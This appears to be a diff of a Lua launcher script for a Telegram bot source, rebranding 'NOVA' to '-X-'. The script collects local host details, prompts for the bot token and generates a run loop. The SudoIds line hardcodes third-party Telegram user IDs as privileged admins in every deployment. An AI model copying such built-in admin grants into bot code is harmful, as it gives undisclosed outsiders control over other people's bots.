@@ -13,42 +13,43 @@ http    = require("socket.http")
 HTTPS   = require("ssl.https") 
 https   = require("ssl.https") 
 User    = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
-Server  = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a') 
+Server_NOVA = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a') 
 DirName = io.popen("echo $(cd $(dirname $0); pwd)"):read('*a'):gsub('[\n\r]+', '')
 Ip      = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a'):gsub('[\n\r]+', '')
 Name    = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a'):gsub('[\n\r]+', '')
 Port    = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"):read('*a'):gsub('[\n\r]+', '')
 UpTime  = io.popen([[uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes"}']]):read('*a'):gsub('[\n\r]+', '')
---     Source NOVA     --
+--     Source -𝐗-     --
 local AutoSet = function() 
-if not bot_data:get(Server.."IdNOVA") then 
+if not bot_data:get(Server_NOVA.."IdNOVA") then 
 io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي ↫ ⤈\n\27[0;33;49m') 
 local DevId = io.read():gsub(' ','') 
 if tostring(DevId):match('%d+') then 
 io.write('\27[1;36mتم حفظ ايدي المطور الاساسي\n27[0;39;49m') 
-bot_data:set(Server.."IdNOVA",DevId) 
-end ---ifok
+bot_data:set(Server_NOVA.."IdNOVA",DevId) 
 else 
-print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nلم يتم حفظ ايدي المطور الاساسي ارسله مره اخرى\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
-end
+print('\27[1;31m●○━━━ -𝐗- ━━━○●\nلم يتم حفظ ايدي المطور الاساسي ارسله مره اخرى\n●○━━━ -𝐗- ━━━○●') 
+end 
 os.execute('lua NOVA.lua') 
 end 
-if not bot_data:get(Server.."TokenNOVA") then 
+if not bot_data:get(Server_NOVA.."TokenNOVA") then 
 io.write('\27[1;35m\nالان قم بارسال توكن البوت ↫ ⤈\n\27[0;33;49m') 
 local TokenBot = io.read() 
 if TokenBot ~= '' then 
 local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getMe') 
+local data = json:decode(url)
 if res ~= 200 then 
-print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nالتوكن غير صحيح تاكد منه ثم ارسله\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
+print('\27[1;31m●○━━━ -𝐗- ━━━○●\nالتوكن غير صحيح تاكد منه ثم ارسله\n●○━━━ -𝐗- ━━━○●') 
 else 
 io.write('\27[1;36mتم حفظ توكن البوت بنجاح\n27[0;39;49m') 
-bot_data:set(Server.."TokenNOVA",TokenBot) 
+bot_data:set(Server_NOVA.."TokenNOVA",TokenBot) 
+bot_data:set(Server_NOVA.."Token_username",""..data.result.username)
 end  
 else 
-print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nلم يتم حفظ توكن البوت ارسله مره اخرى\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
+print('\27[1;31m●○━━━ -𝐗- ━━━○●\nلم يتم حفظ توكن البوت ارسله مره اخرى\n●○━━━ -𝐗- ━━━○●') 
 end  
 os.execute('lua NOVA.lua') 
-end
+end 
 local Create = function(data, file, uglify)  
 file = io.open(file, "w+")   
 local serialized   
@@ -62,29 +63,29 @@ file:close()
 end
 local CreateConfigAuto = function()
 Config = {
-DevId = bot_data:get(Server.."IdNOVA"),
-TokenBot = bot_data:get(Server.."TokenNOVA"),
-NOVA = bot_data:get(Server.."TokenNOVA"):match("(%d+)"),
-SudoIds = {bot_data:get(Server.."IdNOVA")},
+DevId = bot_data:get(Server_NOVA.."IdNOVA"),
+TokenBot = bot_data:get(Server_NOVA.."TokenNOVA"),
+NOVA = bot_data:get(Server_NOVA.."TokenNOVA"):match("(%d+)"),
+SudoIds = {bot_data:get(Server_NOVA.."IdNOVA")},
 }
 Create(Config, "./config.lua") 
 file = io.open("NOVA.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
 cd $HOME/NOVA
-token="]]..bot_data:get(Server.."TokenNOVA")..[["
+token="]]..bot_data:get(Server_NOVA.."TokenNOVA")..[["
 while(true) do
 rm -fr ../.telegram-cli
 if [ ! -f ./tg ]; then
-echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
+echo "●○━━━ -𝐗- ━━━○● ≈ ●○━━━ -𝐗- ━━━○● "
 echo "~ The tg File Was Not Found In The Bot Files!"
-echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
+echo "●○━━━ -𝐗- ━━━○● ≈ ●○━━━ -𝐗- ━━━○● "
 exit 1
 fi
 if [ ! $token ]; then
-echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
+echo "●○━━━ -𝐗- ━━━○● ≈ ●○━━━ -𝐗- ━━━○● "
 echo "~ The Token Was Not Found In The config.lua File!"
-echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
+echo "●○━━━ -𝐗- ━━━○● ≈ ●○━━━ -𝐗- ━━━○● "
 exit 1
 fi
 ./tg -s ./NOVA.lua -p PROFILE --bot=$token
@@ -102,7 +103,7 @@ screen -S NOVA ./NOVA.sh
 done
 ]]) 
 file:close() 
-io.popen("mkdir Files")
+io.popen("mkdir Shop_NOVA")
 os.execute('chmod +x Run;./Run')
 end 
 CreateConfigAuto()
@@ -113,38 +114,43 @@ if not f then
 AutoSet() 
 else 
 f:close() 
-bot_data:del(Server.."IdNOVA");bot_data:del(Server.."TokenNOVA")
+bot_data:del(Server_NOVA.."IdNOVA");bot_data:del(Server_NOVA.."TokenNOVA")
 end 
 local config = loadfile("./config.lua")() 
 return config 
 end  
 Load_NOVA() 
-print("\27[36m"..[[          
-
-___________                    
-\__    ___/______  _______  ___
-  |    |  \_  __ \/  _ \  \/  /
-  |    |   |  | \(  <_> >    < 
-  |____|   |__|   \____/__/\_ \
-                             \/
-
-]]..'\27[m'.."\n\27[35mServer Information ↬ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\27[m\n\27[36m~ \27[mUser \27[36m: \27[10;32m"..User.."\27[m\n\27[36m~ \27[mIp \27[36m: \27[10;32m"..Ip.."\27[m\n\27[36m~ \27[mName \27[36m: \27[10;32m"..Name.."\27[m\n\27[36m~ \27[mPort \27[36m: \27[10;32m"..Port.."\27[m\n\27[36m~ \27[mUpTime \27[36m: \27[10;32m"..UpTime.."\27[m\n\27[35m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\27[m")
+print("\27[36m"..[[ 
+echo " ---------------------------------------------            ";                            
+echo "█▀▀ █▀▀█ █░░█ █▀▀█ █▀▀ █▀▀   ░ ░ █░█ ░ ░ ";
+echo "▀▀█ █░░█ █░░█ █▄▄▀ █░░ █▀▀   ▀ ▀ ▄▀▄ ▀ ▀";
+echo "▀▀▀ ▀▀▀▀ ░▀▀▀ ▀░▀▀ ▀▀▀ ▀▀▀   ░ ░ ▀░▀ ░ ░";
+echo "|-------------------------------------------|";
+echo "█▀▀▄ █▀▀ ▀█░█▀     █▀▄▀█ █▀▀█ █▀▀█ ▀▀█▀▀ █▀▀ █▀▀▄";
+echo "█░░█ █▀▀ ░█▄█░     █░▀░█ █▄▄█ █▄▄▀ ░░█░░ █▀▀ █░░█";
+echo "▀▀▀░ ▀▀▀ ░░▀░░     ▀░░░▀ ▀░░▀ ▀░▀▀ ░░▀░░ ▀▀▀ ▀░░▀";
+echo "|-------------------------------------------|";
+echo "|This Source Was Developed By (HarleN) @Xx_HarleN_xX.|";
+echo "|   This Is The Source Channel @SrcX_B0T .     |";
+echo "|                - NOVA -                 |";
+echo "---------------------------------------------";
+]]..'\27[m'.."\n\27[35mServer Information ↬ ⤈ \n●○━━━ -𝐗- ━━━○● \27[m\n\27[36m~ \27[mUser \27[36m: \27[10;32m"..User.."\27[m\n\27[36m~ \27[mIp \27[36m: \27[10;32m"..Ip.."\27[m\n\27[36m~ \27[mName \27[36m: \27[10;32m"..Name.."\27[m\n\27[36m~ \27[mPort \27[36m: \27[10;32m"..Port.."\27[m\n\27[36m~ \27[mUpTime \27[36m: \27[10;32m"..UpTime.."\27[m\n\27[35m●○━━━ -𝐗- ━━━○● \27[m")
 Config = dofile("./config.lua")
 DevId = Config.DevId
-SudoIds = {Config.SudoIds,1558668590,1177862762,1760798642}
+SudoIds = {Config.SudoIds,2060947106,2076053598}
 NOVA = Config.NOVA
 TokenBot = Config.TokenBot
-NameBot = (bot_data:get(NOVA..'HarleN:NameBot') or 'نوفا')
---     Source NOVA     --
-FilesPrint = "\27[35m".."\nAll Source Files Started ↬ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"..'\27[m'
+NameBot = (bot_data:get(NOVA..'HarleN:NameBot') or 'اكس')
+--     Source -𝐗-     --
+FilesPrint = "\27[35m".."\nAll Source Files Started ↬ ⤈ \n●○━━━ -𝐗- ━━━○● \n"..'\27[m'
 FilesNumber = 0
-for v in io.popen('ls Files'):lines() do
+for v in io.popen('ls Shop_NOVA'):lines() do
 if v:match(".lua$") then
 FilesNumber = FilesNumber + 1
 FilesPrint = FilesPrint.."\27[39m"..FilesNumber.."\27[36m".."~ : \27[10;32m"..v.."\27[m \n"
 end
 end
-FilesPrint = FilesPrint.."\27[35m".."┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n".."\27[m"
+FilesPrint = FilesPrint.."\27[35m".."●○━━━ -𝐗- ━━━○● \n".."\27[m"
 if FilesNumber ~= 0 then
 print(FilesPrint)
 end
